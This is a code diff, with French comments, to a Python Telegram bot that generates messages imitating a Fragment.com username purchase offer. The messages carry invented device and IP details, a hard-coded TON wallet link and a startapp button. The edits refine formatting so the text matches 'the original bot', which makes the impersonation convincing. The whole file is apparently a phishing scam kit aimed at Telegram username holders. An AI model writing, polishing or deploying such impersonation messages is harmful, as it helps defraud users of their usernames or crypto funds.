@@ -65,8 +65,8 @@ def generate_fragment_message(username, ton_amount):
     # Adresse wallet
     wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
     
-    # Message Fragment SANS markdown pour calculer les entities
-    fragment_message_for_entities = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
+    # Message Fragment - IDENTIQUE au bot original
+    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
 
 • Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
 • Commission: 💎{commission:g} (${commission_usd:.2f} USD)
@@ -81,30 +81,13 @@ Additional Information:
 Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
-
-    # Message Fragment final AVEC markdown pour l'envoi
-    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:
-
-• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
-• Commission: 💎{commission:g} (${commission_usd:.2f} USD)
-
-Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.
-
-Additional Information:
-• Device: Safari on macOS  
-• IP Address: 103.56.72.245
-• Wallet: [{wallet_address}](https://tonviewer.com/{wallet_address})
-
-Important:
-• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
-• If you choose not to proceed, simply ignore this message."""
     
-    # Création des entités basées sur le texte SANS markdown
+    # Création des entités pour le formatage
     entities = []
     
     # 1. Offer Amount en gras
     offer_text = f"• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)"
-    offer_start = fragment_message_for_entities.find(offer_text)
+    offer_start = fragment_message.find(offer_text)
     if offer_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -114,7 +97,7 @@ Important:
     
     # 2. Commission en gras
     commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
-    commission_start = fragment_message_for_entities.find(commission_text)
+    commission_start = fragment_message.find(commission_text)
     if commission_start != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -124,7 +107,7 @@ Important:
     
     # 3. Premier point Important en gras
     important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
-    important_start1 = fragment_message_for_entities.find(important_text1)
+    important_start1 = fragment_message.find(important_text1)
     if important_start1 != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -134,7 +117,7 @@ Important:
     
     # 4. Deuxième point Important en gras
     important_text2 = "• If you choose not to proceed, simply ignore this message."
-    important_start2 = fragment_message_for_entities.find(important_text2)
+    important_start2 = fragment_message.find(important_text2)
     if important_start2 != -1:
         entities.append(MessageEntity(
             type=MessageEntity.BOLD,
@@ -142,7 +125,16 @@ Important:
             length=len(important_text2)
         ))
     
-    print(f"✅ Message généré avec entities pour gras + markdown pour lien wallet")
+    # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
+    wallet_start = fragment_message.find(wallet_address)
+    if wallet_start != -1:
+        entities.append(MessageEntity(
+            type=MessageEntity.TEXT_LINK,
+            offset=wallet_start,
+            length=48,  # Longueur exacte de UQ...PR (48 caractères)
+            url=f"https://tonviewer.com/{wallet_address}"
+        ))
+        print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
     
     # 📱 BOUTON STARTAPP - Génère un lien t.me avec startapp
     startapp_param = f"{username}-{price:g}"
@@ -205,8 +197,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                 input_message_content=InputTextMessageContent(
                     fragment_message,
-                    entities=entities,  # ✅ SEULEMENT ENTITIES (gras + lien)
-                    disable_web_page_preview=True
+                    entities=entities,
+                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS
                 ),
                 reply_markup=keyboard
             )
